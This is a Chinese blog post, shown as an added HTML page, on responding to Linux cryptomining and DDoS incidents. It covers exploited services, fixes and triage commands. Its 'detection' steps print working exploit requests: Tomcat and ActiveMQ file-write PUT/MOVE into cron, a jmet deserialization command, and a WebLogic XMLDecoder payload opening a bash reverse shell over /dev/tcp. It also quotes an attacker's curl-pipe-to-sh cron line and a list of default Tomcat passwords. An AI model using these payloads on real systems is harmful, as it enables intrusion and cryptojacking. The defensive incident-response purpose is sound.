@@ -1,0 +1,1546 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="爆破,linux,应急响应,命令执行,反序列化,Redis,Memcache,Weblogic,ActiveMQ,Tomcat,Kubernetes,RMI,Docker,Struts2,未授权访问," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="瓦都剋" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="前言从去年六月份到现在做的应急响应、事件分析大大小小的做了23十个，主要遇到的有挖矿、DDoS、短信接口盗刷、用户接口泄漏、越权信息获取、挂黑页、删数据等。本文只针对自己做的应急响应中的挖矿和DDoS两类做一下总结及自己的处置方法，帮助运维等相关人员在遇到之后能够快速响应、处置。文章有不足之处欢迎大家指出、补充。 0x01 应急事件处理流程是什么？服务器安全排查 webshell 查找  木马病毒">
+<meta name="keywords" content="爆破,linux,应急响应,命令执行,反序列化,Redis,Memcache,Weblogic,ActiveMQ,Tomcat,Kubernetes,RMI,Docker,Struts2,未授权访问">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于Linux挖矿、DDOS等应急事件处置方法">
+<meta property="og:url" content="http://byd.dropsec.xyz/2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/index.html">
+<meta property="og:site_name" content="瓦都剋">
+<meta property="og:description" content="前言从去年六月份到现在做的应急响应、事件分析大大小小的做了23十个，主要遇到的有挖矿、DDoS、短信接口盗刷、用户接口泄漏、越权信息获取、挂黑页、删数据等。本文只针对自己做的应急响应中的挖矿和DDoS两类做一下总结及自己的处置方法，帮助运维等相关人员在遇到之后能够快速响应、处置。文章有不足之处欢迎大家指出、补充。 0x01 应急事件处理流程是什么？服务器安全排查 webshell 查找  木马病毒">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/redis-1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/memcache-1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/docker-1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/k8s-1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/3389-1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/3389-2.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/struts2-2.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/javarmi-1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/javarmi-2.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-0.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-2.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-3.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-4.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-5.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-6.png">
+<meta property="og:updated_time" content="2018-05-08T10:04:43.931Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于Linux挖矿、DDOS等应急事件处置方法">
+<meta name="twitter:description" content="前言从去年六月份到现在做的应急响应、事件分析大大小小的做了23十个，主要遇到的有挖矿、DDoS、短信接口盗刷、用户接口泄漏、越权信息获取、挂黑页、删数据等。本文只针对自己做的应急响应中的挖矿和DDoS两类做一下总结及自己的处置方法，帮助运维等相关人员在遇到之后能够快速响应、处置。文章有不足之处欢迎大家指出、补充。 0x01 应急事件处理流程是什么？服务器安全排查 webshell 查找  木马病毒">
+<meta name="twitter:image" content="http://oa8y5guqs.bkt.clouddn.com/redis-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键词进行搜索","hits_empty":"找不到关于“${query}”的文章","hits_stats":"共找到 ${hits} 篇文化在那个，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://byd.dropsec.xyz/2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/"/>
+
+
+
+
+
+  <title>关于Linux挖矿、DDOS等应急事件处置方法 | 瓦都剋</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?61c879c1c104a92aab1d6e4b6888ffe5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">瓦都剋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Looking at yourself from a different Angle!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/daima" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wrench"></i> <br />
+            
+            工具
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-daohang">
+          <a href="/daohang" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://byd.dropsec.xyz/2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="瓦都剋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="瓦都剋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">关于Linux挖矿、DDOS等应急事件处置方法</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-08T21:13:11+08:00">
+                2018-05-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/05/08/关于Linux挖矿、DDOS等应急事件处置方法/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  2,706
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从去年六月份到现在做的应急响应、事件分析大大小小的做了23十个，主要遇到的有挖矿、DDoS、短信接口盗刷、用户接口泄漏、越权信息获取、挂黑页、删数据等。本文只针对自己做的应急响应中的<code>挖矿</code>和<code>DDoS</code>两类做一下总结及自己的处置方法，帮助运维等相关人员在遇到之后能够快速响应、处置。文章有不足之处欢迎大家指出、补充。</p>
+<h1 id="0x01-应急事件处理流程是什么？"><a href="#0x01-应急事件处理流程是什么？" class="headerlink" title="0x01 应急事件处理流程是什么？"></a>0x01 应急事件处理流程是什么？</h1><h2 id="服务器安全排查"><a href="#服务器安全排查" class="headerlink" title="服务器安全排查"></a>服务器安全排查</h2><ul>
+<li><p>webshell 查找</p>
+</li>
+<li><p>木马病毒查找和清理</p>
+</li>
+<li><p>恶意进程、网络连接和自启任务等清理</p>
+</li>
+</ul>
+<h2 id="问题事件分析"><a href="#问题事件分析" class="headerlink" title="问题事件分析"></a>问题事件分析</h2><ul>
+<li>溯源事件缘由、黑客攻击途径</li>
+</ul>
+<h2 id="应用系统安全漏洞排查"><a href="#应用系统安全漏洞排查" class="headerlink" title="应用系统安全漏洞排查"></a>应用系统安全漏洞排查</h2><ul>
+<li>应用安全漏洞排查</li>
+</ul>
+<h1 id="0x02-攻击者进行挖矿、DDoS利用的漏洞有哪些？"><a href="#0x02-攻击者进行挖矿、DDoS利用的漏洞有哪些？" class="headerlink" title="0x02 攻击者进行挖矿、DDoS利用的漏洞有哪些？"></a>0x02 攻击者进行挖矿、DDoS利用的漏洞有哪些？</h1><h2 id="1、未授权访问"><a href="#1、未授权访问" class="headerlink" title="1、未授权访问"></a>1、未授权访问</h2><p>未授权访问在我所处置的应急响应事件中所占的比重最大，主要分为以下几种：</p>
+<ol>
+<li><p>redis未授权访问</p>
+<p>redis未授权访问主要被用来进行挖矿，一般手段是通过redis写入计划任务，基本上都是形如：<code>/bin/sh -c /usr/bin/curl -sL https://lnk0.com/VhscA1|sh</code>，直接进行挖矿、ddos等。</p>
+<p><strong>排查方法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redis-cli -h host -p port</div></pre></td></tr></table></figure>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/redis-1.png" alt=""></p>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li>绑定本地访问：<code>bind 127.0.0.1</code></li>
+<li>添加认证：<code>requirepass www.secpulse.com</code></li>
+</ul>
+</li>
+<li><p>memcache未授权访问</p>
+<p>memcache未授权访问主要被用来进行DDoS，在今年三月份爆发，攻击者利用memcached协议，发送大量带有被害者IP地址的UDP数据包给放大器主机，然后放大器主机对伪造的IP地址源做出大量回应，形成分布式拒绝服务攻击，从而形成DRDoS反射。</p>
+<p><strong>排查方法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc host port</div></pre></td></tr></table></figure>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/memcache-1.png" alt=""></p>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li>设置memchached只允许本地访问</li>
+<li>禁止外网访问Memcached 11211端口</li>
+<li>编译时加上–enable-sasl，启用SASL认证</li>
+</ul>
+</li>
+<li><p>docker未授权访问</p>
+<p>docker未授权访问主要被用来进行挖矿，通过挂载宿主机的<code>/etc/</code>、<code>/var/spool/cron/</code>等目录，之后将相关挖矿的脚本、命令等写入到<code>/etc/crontab</code>，<code>/var/spool/cron/crontabs/root</code>中。</p>
+<p><strong>排查方法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://IP:2375/containers/json</div></pre></td></tr></table></figure>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/docker-1.png" alt=""></p>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li>在不必需的情况下，不要启用docker的remote api服务</li>
+<li>在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证</li>
+</ul>
+</li>
+<li><p>k8s未授权访问</p>
+<p>k8s未授权访问主要被用来挖矿，API Server 默认会开启两个端口：8080和 6443。其中 8080 端口无需认证，6443 端口需要认证，且有 TLS 保护，直接访问8080端口会返回可用的API列表。访问dashboard 页面，可以创建、修改、删除容器，查看日志等。攻击者利用的流程大体为：<code>创建新的容器 -&gt; 挂载宿主机目录 -&gt; 写 /etc/crontab</code>定时任务进行挖矿。</p>
+<p><strong>排查方法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://IP:8080/</div></pre></td></tr></table></figure>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/k8s-1.png" alt=""></p>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li>配置安全组、防火墙等，禁止敏感端口对外开放</li>
+<li>为管理端添加认证<h2 id="2、Tomcat"><a href="#2、Tomcat" class="headerlink" title="2、Tomcat"></a>2、Tomcat</h2></li>
+</ul>
+</li>
+</ol>
+<p>Tomcat目前常被利用的有：</p>
+<ul>
+<li><p>Tomcat PUT任意文件写入漏洞（CVE-2017-12615）</p>
+<p><strong>排查方法：</strong></p>
+<p>直接发送以下数据包即可在Web根目录写入shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PUT /test.jsp/ HTTP/1.1</div><div class="line">Host: ip:port</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en</div><div class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 4</div><div class="line"></div><div class="line">test</div></pre></td></tr></table></figure>
+</li>
+<li><p>Tomcat弱口令部署war包getshell</p>
+<p><strong>排查方法：</strong></p>
+<p>查看tomcat管理控制台是否存在如下弱口令：</p>
+<p>| 用户名 |    密码    |<br>| :—-: | :——–: |<br>| tomcat |   tomcat   |<br>| admin  |   j5Brn9   |<br>| admin  |   admin    |<br>| admin  |   tomcat   |<br>|  role  | changethis |<br>| role1  |   role1    |<br>|  root  |    root    |<br>|  root  | changethis |<br>| role1  |   tomcat   |<br>|  both  |   tomcat   |<br>| tomcat | changethis |</p>
+</li>
+</ul>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li>严禁弱口令，使用数字+字母+特殊字符的十位以上强密码</li>
+<li>及时升级Tomcat补丁</li>
+<li>安全组、防火墙等设置访问白名单</li>
+</ul>
+<h2 id="3、ActiveMQ"><a href="#3、ActiveMQ" class="headerlink" title="3、ActiveMQ"></a>3、ActiveMQ</h2><p>ActiveMQ目前常被利用的有：</p>
+<ul>
+<li><p>ActiveMQ反序列化命令执行（CVE-2015-5254）</p>
+<p>默认开启61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。攻击者利用的流程为：<code>构造可执行命令的序列化对象 -&gt; 作为一个消息，发送给目标61616端口 -&gt;访问web管理页面，读取消息，触发漏洞</code></p>
+<p><strong>排查方法：</strong></p>
+<p>下载jmet的jar文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/activemq&quot; -Yp ROME IP 61616</div></pre></td></tr></table></figure>
+<p>访问：<code>http://ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息</p>
+<p>点击查看这条消息即可触发命令执行</p>
+</li>
+<li><p>ActiveMQ fileserver任意文件写入漏洞（CVE-2016-3088）</p>
+<p>ActiveMQ的web控制台8161端口分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api需要登录后才能使用，fileserver无需登录。目前见到的是直接写入cron挖矿，简单粗暴！</p>
+<p><strong>排查方法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PUT /fileserver/test.txt HTTP/1.1</div><div class="line">Host: ip:8161</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en</div><div class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line">Connection: close</div><div class="line">Content-Length: 4</div><div class="line"></div><div class="line">test</div></pre></td></tr></table></figure>
+<p>写入到计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">MOVE /fileserver/text.txt HTTP/1.1</div><div class="line">Destination: file:///etc/cron.d/root</div><div class="line">Host: ip:8161</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en</div><div class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line">Connection: close</div><div class="line">Content-Length: 0</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li>严禁弱口令，使用数字+字母+特殊字符的十位以上强密码</li>
+<li>及时升级ActiveMQ补丁</li>
+<li>安全组、防火墙等设置访问白名单</li>
+</ul>
+<h2 id="4、爆破"><a href="#4、爆破" class="headerlink" title="4、爆破"></a>4、爆破</h2><p>主要是Windows3389、Linux ssh爆破，爆破成功之后直接执行命令进行挖矿、DDoS。</p>
+<p><strong>排查方法：</strong></p>
+<p>网上搜索自己的密码是否被公开活在黑客字典中</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/3389-1.png" alt=""></p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/3389-2.png" alt=""></p>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li>严禁弱口令，使用数字+字母+特殊字符的十位以上强密码</li>
+<li>安全组、防火墙等设置白名单访问</li>
+</ul>
+<h2 id="5、Struts2"><a href="#5、Struts2" class="headerlink" title="5、Struts2"></a>5、Struts2</h2><p>利用Struts2反序列化命令执行，直接执行相关命令。</p>
+<p><strong>排查方法：</strong></p>
+<p>搜索网上一键扫描struts2漏洞的工具进行检测</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/struts2-2.png" alt=""></p>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li>及时升级Struts2相关补丁<h2 id="6、Java-RMI命令执行"><a href="#6、Java-RMI命令执行" class="headerlink" title="6、Java RMI命令执行"></a>6、Java RMI命令执行</h2></li>
+</ul>
+<p>RMI服务的默认开放1099端口，且暴露在公网中，并且恰好使用了Apache Commons Collections的缺陷版本，可被直接利用来进行任意命令执行。</p>
+<p><strong>排查方法：</strong></p>
+<p>使用nmap进行端口扫描</p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/javarmi-1.png" alt=""></p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/javarmi-2.png" alt=""></p>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li>升级相应缺陷版本</li>
+<li>安全组、防火墙等设置拒绝RMI端口访问</li>
+</ul>
+<h2 id="7、Weblogic"><a href="#7、Weblogic" class="headerlink" title="7、Weblogic"></a>7、Weblogic</h2><p>目前见到的主要被利用的是Weblogic wls-wsat XMLDecoder反序列化漏洞（CVE-2017-10271）。</p>
+<blockquote>
+<p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
+</blockquote>
+<p><strong>排查方法：</strong></p>
+<p>发送如下数据包，注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</div><div class="line">Host: IP:7001</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en</div><div class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</div><div class="line">Connection: close</div><div class="line">Content-Type: text/xml</div><div class="line">Content-Length: 633</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</div><div class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</div><div class="line">&lt;void index=&quot;0&quot;&gt;</div><div class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</div><div class="line">&lt;/void&gt;</div><div class="line">&lt;void index=&quot;1&quot;&gt;</div><div class="line">&lt;string&gt;-c&lt;/string&gt;</div><div class="line">&lt;/void&gt;</div><div class="line">&lt;void index=&quot;2&quot;&gt;</div><div class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.2.11/8080 0&amp;gt;&amp;amp;1&lt;/string&gt;</div><div class="line">&lt;/void&gt;</div><div class="line">&lt;/array&gt;</div><div class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</div><div class="line">&lt;/java&gt;</div><div class="line">&lt;/work:WorkContext&gt;</div><div class="line">&lt;/soapenv:Header&gt;</div><div class="line">&lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure>
+<p><strong>修复方法：</strong></p>
+<ul>
+<li><p>升级weblogic相关补丁到最新版本</p>
+</li>
+<li><p>安全组、防火墙等设置相关敏感端口白名单访问</p>
+</li>
+</ul>
+<h1 id="0x03-应急响应快速排查步骤"><a href="#0x03-应急响应快速排查步骤" class="headerlink" title="0x03 应急响应快速排查步骤"></a>0x03 应急响应快速排查步骤</h1><p>以Linux为例，以下相关步骤<strong>只针对挖矿、DDoS相关安全事件的排查</strong>，以便快速、高效解决问题。其他安全事件按照通用事件排查步骤即可。</p>
+<h2 id="检查进程及文件"><a href="#检查进程及文件" class="headerlink" title="检查进程及文件"></a>检查进程及文件</h2><p><code>top -c</code> ： 快速查看进程信息，并获取进程文件位置</p>
+<p><code>kill -9 PID</code> ： 杀死进程</p>
+<p>根据恶意进程、文件特征如：文件名、文件大小、文件创建时间进行全盘搜索</p>
+<p><code>grep -rni &quot;shell.name&quot; *</code> ： 根据文件名特征查找</p>
+<p><code>find / -size 1223123c</code> ： 根据文件大小特征查找</p>
+<p><code>find / -mtime 1 -name *</code> ： 根据文件创建时间查找</p>
+<p><code>lsof -p PID</code>：查看进程占用信息</p>
+<p><code>cd /proc/PID</code> ： 进入到进程中</p>
+<p><code>cat * |strings -n 5 |more</code> ： 读取该进程内存中的信息</p>
+<h2 id="检测网络"><a href="#检测网络" class="headerlink" title="检测网络"></a>检测网络</h2><p><code>lsof -i:5000</code> ： 查看5000端口的占用情况</p>
+<p><code>netstat -nap</code> ： 查看不正常端口</p>
+<p><code>netstat -an | grep tcp | awk &#39;{print $5}&#39;</code> ： 查看TCP连接</p>
+<p><code>netstat -an | grep SYN | awk &#39;{print $5}&#39; | awk -F: &#39;{print $1}&#39; | sort | uniq -c | sort -nr | more</code> ： 查看SYN连接</p>
+<h2 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h2><p><code>crontab -u root -l</code> ： 查看root用户的计划任务</p>
+<p><code>cat /etc/crontab</code> ： 查看<code>/etc/crontab</code></p>
+<p><code>ls -al  /etc/cron.*</code> ： 查看cron文件是否变化的详细信息</p>
+<p><code>ll /var/spool/cron/</code> ： 查看<code>/var/spool/cron/</code> </p>
+<h2 id="检查系统命令"><a href="#检查系统命令" class="headerlink" title="检查系统命令"></a>检查系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ls -alt /bin/ | head -n 10</div><div class="line">ls -alt /usr/sbin/ | head -n 10</div><div class="line">ls -alt /usr/bin/ | head -n 10</div></pre></td></tr></table></figure>
+<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>1、<a href="http://n.shellpub.com/" target="_blank" rel="external">河马</a></p>
+<p>2、自写脚本（推荐，因为可根据情况，自己加特征等）</p>
+<h2 id="使用杀毒软件"><a href="#使用杀毒软件" class="headerlink" title="使用杀毒软件"></a>使用杀毒软件</h2><p>ClamAV</p>
